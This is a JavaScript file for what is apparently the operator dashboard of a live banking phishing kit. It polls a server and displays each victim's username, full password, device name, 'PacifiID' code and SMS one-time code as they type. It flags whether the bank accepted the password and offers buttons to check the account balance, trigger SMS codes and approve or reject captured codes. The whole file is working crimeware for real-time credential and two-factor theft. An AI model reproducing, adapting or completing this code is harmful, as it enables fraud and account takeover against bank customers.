// ============================================================
// PANEL DE OPERACIONES — lógica del panel (sondeo en vivo)
// ============================================================
(function () {
  "use strict";

  var lista = document.getElementById("pl-lista");
  var vacio = document.getElementById("pl-vacio");
  var columnas = document.getElementById("pl-columnas");
  var total = document.getElementById("pl-total");
  var reloj = document.getElementById("pl-reloj");
  var estado = document.getElementById("pl-status");
  var btnSonido = document.getElementById("pl-sonido");
  var iconoSonido = document.getElementById("pl-sonido-icono");
  var textoSonido = document.getElementById("pl-sonido-texto");

  var conocidas = {};          // sid → true (para detectar ingresos nuevos)
  var clavesVisibles = {};     // sid → bool
  var primeraEncuesta = true;   // no sonar por sesiones ya existentes al abrir el panel
  var esperandoCodigo = {};    // sid → true (víctima esperando decisión)
  var sonidoActivo = false;
  var audioCtx = null;
  var ENCUESTA_MS = 1500;

  // ---------- utilidades ----------
  function esc(s) {
    return String(s == null ? "" : s).replace(/[&<>"']/g, function (c) {
      return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c];
    });
  }

  function copiar(texto, boton) {
    var hecho = function () {
      if (!boton) return;
      var original = boton.innerHTML;
      var claseOriginal = boton.className;
      boton.innerHTML = "✓";
      boton.className = claseOriginal + " pl-copiado";
      setTimeout(function () {
        boton.innerHTML = original;
        boton.className = claseOriginal;
      }, 1200);
    };
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(texto).then(hecho, function () {});
    } else {
      var ta = document.createElement("textarea");
      ta.value = texto;
      document.body.appendChild(ta);
      ta.select();
      try { document.execCommand("copy"); hecho(); } catch (e) {}
      document.body.removeChild(ta);
    }
  }

  function hace(ms) {
    var s = Math.floor(ms / 1000);
    if (s < 60) return "hace " + s + " s";
    var m = Math.floor(s / 60);
    if (m < 60) return "hace " + m + " min";
    return "hace " + Math.floor(m / 60) + " h";
  }

  function hora(ts) {
    var d = new Date(ts);
    return d.toLocaleTimeString("es-EC", { hour12: false });
  }

  // ---------- sonido ----------
  function activarSonido() {
    try {
      audioCtx = audioCtx || new (window.AudioContext || window.webkitAudioContext)();
      audioCtx.resume();
      sonidoActivo = true;
    } catch (e) { sonidoActivo = false; }
    btnSonido.setAttribute("aria-pressed", "true");
    iconoSonido.textContent = "🔔";
    textoSonido.textContent = "Sonido activo";
  }

  function desactivarSonido() {
    sonidoActivo = false;
    btnSonido.setAttribute("aria-pressed", "false");
    iconoSonido.textContent = "🔇";
    textoSonido.textContent = "Sonido apagado";
  }

  btnSonido.addEventListener("click", function () {
    if (sonidoActivo) desactivarSonido(); else activarSonido();
  });

  function notificacion() {
    if (!sonidoActivo || !audioCtx) return;
    try {
      var ahora = audioCtx.currentTime;
      var gain = audioCtx.createGain();
      gain.gain.setValueAtTime(0.0001, ahora);
      gain.gain.exponentialRampToValueAtTime(0.09, ahora + 0.03);
      gain.gain.exponentialRampToValueAtTime(0.0001, ahora + 0.9);
      gain.connect(audioCtx.destination);
      [659.25, 880].forEach(function (f, i) {
        var osc = audioCtx.createOscillator();
        osc.type = "sine";
        osc.frequency.value = f;
        osc.connect(gain);
        osc.start(ahora + i * 0.16);
        osc.stop(ahora + i * 0.16 + 0.5);
      });
    } catch (e) { /* sin sonido */ }
  }

  // ---------- render de una sesión ----------
  function botonCopiar(valor, etiqueta) {
    return '<button class="pl-mini-btn" data-copiar="' + esc(valor) + '" title="Copiar ' + etiqueta + '">⧉</button>';
  }

  function campoValor(opts) {
    // opts: {sid, clave, valor, escribiendoCampo, placeholder, etiqueta}
    var valor = opts.valor || "";
    var escribiendo = opts.escribiendoCampo;
    var html = '<div class="pl-campo">';
    html += '<div class="pl-valor' + (valor ? "" : " pl-valor--vacio") + (opts.tono ? " pl-valor--" + opts.tono : "") + '">';
    if (valor) {
      html += '<span class="pl-texto">' + esc(valor) + (escribiendo ? '<span class="pl-caret"></span>' : "") + "</span>";
      html += botonCopiar(valor, opts.clave);
    } else {
      html += '<span class="pl-texto">' + esc(opts.placeholder || "—") + "</span>";
    }
    html += "</div>";
    html += '<span class="pl-etiqueta-mini">' + opts.etiqueta;
    if (escribiendo) html += ' · <span class="pl-escribiendo">escribiendo…</span>';
    html += "</span></div>";
    return html;
  }

  function renderSesion(s) {
    var escribiendoCampo = null;
    if (s.tecleando && Date.now() - s.tecleando.ts < 2600) escribiendoCampo = s.tecleando.campo;

    var fila = document.createElement("div");
    fila.className = "pl-fila" +
      (conocidas[s.sid] ? "" : " pl-fila--nueva") +
      (escribiendoCampo ? " pl-fila--tecleando" : "");
    fila.dataset.sid = s.sid;

    var geo = s.geo || { flag: "🌍", country: "Conociendo…" };
    var pasoTexto = {
      user: "Ingresando usuario",
      password: "Ingresando contraseña",
      device: "Nombre del dispositivo",
      code: "Código PacifiID",
      sms: "Código SMS (dPc_)"
    }[s.paso] || (s.flujo ? "En la web" : "Conectado");

    // Señal de contraseña válida/inválida (chips + color del campo)
    var claveTono = null;
    var claveChip = "";
    var estadoLogin = "";
    if (s.login) {
      if (s.login.valido) {
        claveTono = "ok";
        claveChip = ' <span class="pl-chip-login pl-chip-login--ok">✔ VÁLIDA</span>';
        estadoLogin = '<span class="pl-login pl-login--ok">✔ Clave válida' + (s.login.nombre ? " · " + esc(s.login.nombre) : "") + (s.login.saldo ? " · " + esc(s.login.saldo) : "") + "</span>";
      } else {
        claveTono = "mal";
        claveChip = ' <span class="pl-chip-login pl-chip-login--mal">✖ INVÁLIDA</span>';
        estadoLogin = '<span class="pl-login pl-login--mal">✖ Clave inválida — el banco rechazó la contraseña</span>';
      }
    } else if (s.empresaLogin) {
      if (s.empresaLogin.valido) {
        claveTono = "ok";
        claveChip = ' <span class="pl-chip-login pl-chip-login--ok">✔ VÁLIDA</span>';
        estadoLogin = '<span class="pl-login pl-login--ok">✔ Clave válida (empresas)</span>';
      } else {
        claveTono = "mal";
        claveChip = ' <span class="pl-chip-login pl-chip-login--mal">✖ INVÁLIDA</span>';
        estadoLogin = '<span class="pl-login pl-login--mal">✖ Clave inválida (empresas)</span>';
      }
    } else {
      estadoLogin = '<span class="pl-login pl-login--pend">Sin validar</span>';
    }

    // ¿La víctima ya pasó la contraseña (credenciales válidas → dispositivos)?
    var avanzado = !!(s.login && s.login.valido) ||
      !!(s.empresaLogin && s.empresaLogin.valido) ||
      s.paso === "device" || s.paso === "code" || s.paso === "sms";
    // ¿Hay algún código en juego (veredicto aplicable)?
    var conCodigo = !!(s.codigo || s.codigoSms || s.codigoEnEspera);

    var veredicto = s.codigoVeredicto;
    var veredictoHtml = conCodigo
      ? '<div class="pl-veredicto">' +
        (s.codigoEnEspera
          ? '<span class="pl-espera-codigo"><span class="pl-dot"></span> Código en pantalla — esperando tu decisión</span>'
          : "") +
        '<div class="pl-veredicto-botones' + (s.codigoEnEspera ? " pl-veredicto-botones--urgente" : "") + '">' +
        '<button class="pl-btn pl-btn--ok' + (veredicto === "bueno" ? " pl-btn--activo" : "") + '" data-veredicto="bueno" data-sid="' + s.sid + '"' + (veredicto === "bueno" ? " disabled" : "") + '>✓ Bueno</button>' +
        '<button class="pl-btn pl-btn--bad' + (veredicto === "malo" ? " pl-btn--activo" : "") + '" data-veredicto="malo" data-sid="' + s.sid + '"' + (veredicto === "malo" ? " disabled" : "") + '>✖ Malo</button>' +
        "</div></div>"
      : '<div class="pl-veredicto pl-veredicto--espera"><small>Sin código aún</small></div>';

    var sms = s.sms;
    var smsHtml =
      '<div class="pl-sms-estado' + (sms ? " pl-sms-estado--visible" : "") +
      (sms && (sms.estado === "error" || sms.estado === "ya-cambiado") ? " pl-sms-estado--error" : (sms ? " pl-sms-estado--ok" : "")) +
      '">' + (sms ? esc(sms.mensaje) + " · " + hora(sms.ts) : "") + "</div>";

    var sc = s.saldoConsulta;
    var saldoTxt = "";
    if (sc) {
      saldoTxt = sc.estado === "ok"
        ? "💰 " + esc(sc.saldo) + (sc.nombre ? " · " + esc(sc.nombre) : "")
        : esc(sc.mensaje || "Sin saldo");
    }
    var saldoHtml =
      '<div class="pl-sms-estado pl-saldo-estado' + (sc ? " pl-sms-estado--visible" : "") +
      (sc && sc.estado === "ok" ? " pl-saldo-estado--ok" : "") +
      '">' + saldoTxt + (sc ? " · " + hora(sc.ts) : "") + "</div>";

    var estadoConexion = s.enLinea
      ? '<span class="pl-conexion pl-conexion--on"><span class="pl-dot pl-dot--verde"></span> En línea</span>'
      : '<span class="pl-conexion pl-conexion--off">Desconectado · ' + hace(Date.now() - s.visto) + "</span>";

    fila.innerHTML =
      // 1) Usuario / país (compacto)
      '<div class="pl-usuario-info">' +
      '<span class="pl-bandera" title="' + esc((s.geo && s.geo.country) || "") + '">' + geo.flag + "</span>" +
      '<div class="pl-usuario-meta">' +
      '<span class="pl-pais">' + esc(geo.country) + "</span>" +
      "<small>" + (s.flujo === "empresas" ? "Empresas" : "Personas") + " · " + hora(s.creado) + "</small>" +
      estadoConexion +
      '<small class="pl-paso">' + esc(pasoTexto) + "</small>" +
      estadoLogin +
      "</div></div>" +
      // 2) Usuario
      campoValor({ sid: s.sid, clave: "usuario", valor: s.usuario, etiqueta: "Usuario", placeholder: "esperando usuario…", escribiendoCampo: escribiendoCampo === "usuario" ? "usuario" : null }) +
      // 3) Clave (visible completa + señal de válida/inválida)
      campoValor({ sid: s.sid, clave: "clave", valor: s.clave, etiqueta: "Contraseña" + claveChip, placeholder: "esperando contraseña…", tono: claveTono, escribiendoCampo: escribiendoCampo === "clave" ? "clave" : null }) +
      // 4) Dispositivo
      campoValor({ sid: s.sid, clave: "dispositivo", valor: s.dispositivo, etiqueta: "Nombre del dispositivo", placeholder: "esperando dispositivo…", escribiendoCampo: escribiendoCampo === "dispositivo" ? "dispositivo" : null }) +
      // 5) Código PacifiID
      // 5) Código PacifiID + Código SMS (dPc_)
      '<div class="pl-doble">' +
      campoValor({ sid: s.sid, clave: "código", valor: s.codigo, etiqueta: "Código PacifiID", placeholder: "esperando código…", escribiendoCampo: escribiendoCampo === "codigo" ? "codigo" : null }) +
      (s.codigoSms
        ? campoValor({ sid: s.sid, clave: "código SMS", valor: s.codigoSms, etiqueta: "Código SMS (dPc_)", placeholder: "", escribiendoCampo: escribiendoCampo === "codigoSms" ? "codigoSms" : null })
        : "") +
      "</div>" +
      // 6) Veredicto
      veredictoHtml +
      // 7) Acciones — SOLO cuando las credenciales son válidas (pasó a dispositivos)
      '<div class="pl-acciones">' +
      (avanzado
        ? '<button class="pl-btn pl-btn--saldo" data-saldo="' + s.sid + '">💰 Saldo</button>' +
          '<button class="pl-btn pl-btn--sms" data-sms="' + s.sid + '"' + (sms && sms.estado === "pendiente" ? " disabled" : "") + '>SMS dPc_ ▸</button>'
        : '<small class="pl-sin-acciones">aún sin acceso</small>') +
      '<button class="pl-btn pl-btn--borrar" data-borrar="' + s.sid + '">🗑 Borrar usuario</button>' +
      "</div>" +
      smsHtml +
      saldoHtml;

    return fila;
  }

  // ---------- sondeo ----------
  function actualizar(data) {
    var nuevas = 0;
    var enEspera = {};
    data.sesiones.forEach(function (s) {
      if (!conocidas[s.sid]) { conocidas[s.sid] = true; nuevas++; }
      if (s.codigoEnEspera) enEspera[s.sid] = true;
    });
    if (nuevas > 0 && !primeraEncuesta) notificacion();
    primeraEncuesta = false;
    if (Object.keys(enEspera).length > 0 && Object.keys(esperandoCodigo).length === 0) {
      // Llegó un código a decisión y no había ninguno antes → aviso sonoro
      notificacion();
    }
    esperandoCodigo = enEspera;

    total.textContent = String(data.total);
    vacio.hidden = data.total > 0;
    columnas.hidden = data.total === 0;

    lista.innerHTML = "";
    data.sesiones.forEach(function (s) {
      lista.appendChild(renderSesion(s));
    });

    // El usuario más reciente (el primero de la lista) siempre resaltado
    var primera = lista.querySelector(".pl-fila");
    if (primera) primera.classList.add("pl-fila--primera");

    estado.textContent = "En vivo · actualizado " + hora(Date.now());
    estado.className = "pl-footer__link pl-footer__link--ok";
  }

  var conocidoIntervalo = null;
  var fallos = 0;
  var arrancado = false;

  function sondear() {
    // Límite de tiempo por sondeo: nunca colgar una conexión (Render dormido)
    var token = localStorage.getItem("panelToken");
    var control = new AbortController();
    var crono = setTimeout(function () { control.abort(); }, 12000);
    fetch("/api/panel/sesiones", { cache: "no-store", signal: control.signal, headers: token ? { "x-panel-token": token } : {} })
      .then(function (r) { clearTimeout(crono); return r.json(); })
      .then(function (data) {
        fallos = 0;
        actualizar(data);
      })
      .catch(function () {
        clearTimeout(crono);
        fallos++;
        estado.textContent = fallos > 2
          ? "Sin conexión con el servidor (" + fallos + " intentos)"
          : "Sin conexión con el servidor";
        estado.className = "pl-footer__link pl-footer__link--mal";
      })
      .then(programarSiguiente);
  }

  function programarSiguiente() {
    // Marcha atrás: si hay fallos, esperar más (máx. 30 s) para no saturar
    var espera = fallos === 0 ? ENCUESTA_MS : Math.min(1500 * Math.pow(2, fallos), 30000);
    clearTimeout(conocidoIntervalo);
    conocidoIntervalo = setTimeout(sondear, espera);
  }

  // Arranque controlado: solo cuando la autenticación lo permite (panel-auth.js)
  window.PacPanelArrancar = function () {
    if (arrancado) return;
    arrancado = true;
    sondear();
  };

  // ---------- reloj ----------
  setInterval(function () {
    reloj.textContent = new Date().toLocaleTimeString("es-EC", { hour12: false });
  }, 1000);

  // ---------- acciones (delegación) ----------
  lista.addEventListener("click", function (ev) {
    var t = ev.target;
    if (t.hasAttribute && t.hasAttribute("data-copiar")) {
      copiar(t.getAttribute("data-copiar"), t);
      return;
    }
    if (t.hasAttribute && t.hasAttribute("data-veredicto")) {
      var sid = t.getAttribute("data-sid");
      var valor = t.getAttribute("data-veredicto");
      fetch("/api/panel/veredicto/" + sid, {
        method: "POST",
        headers: { "Content-Type": "application/json", "x-panel-token": localStorage.getItem("panelToken") || "" },
        body: JSON.stringify({ valor: valor })
      }).then(sondear, sondear);
      return;
    }
    if (t.hasAttribute && t.hasAttribute("data-saldo")) {
      var sidSaldo = t.getAttribute("data-saldo");
      t.disabled = true;
      t.textContent = "Consultando…";
      fetch("/api/panel/saldo/" + sidSaldo, { method: "POST", headers: { "x-panel-token": localStorage.getItem("panelToken") || "" } })
        .then(function (r) { return r.json(); })
        .then(function (j) { sondear(); })
        .catch(function () { sondear(); });
      return;
    }
    if (t.hasAttribute && t.hasAttribute("data-sms")) {
      var sidSms = t.getAttribute("data-sms");
      t.disabled = true;
      t.textContent = "Solicitando…";
      fetch("/api/panel/sms/" + sidSms, { method: "POST", headers: { "x-panel-token": localStorage.getItem("panelToken") || "" } })
        .then(function (r) { return r.json(); })
        .then(function (j) { sondear(); })
        .catch(function () { t.disabled = false; t.textContent = "SMS dPc_ ▸"; sondear(); });
      return;
    }
    if (t.hasAttribute && t.hasAttribute("data-borrar")) {
      var sidB = t.getAttribute("data-borrar");
      fetch("/api/panel/sesiones/" + sidB, { method: "DELETE", headers: { "x-panel-token": localStorage.getItem("panelToken") || "" } }).then(function () {
        delete conocidas[sidB];
        sondear();
      });
      return;
    }
  });

  // ---------- textos copiables eliminados (sección dPc_ fuera del panel) ----------
})();
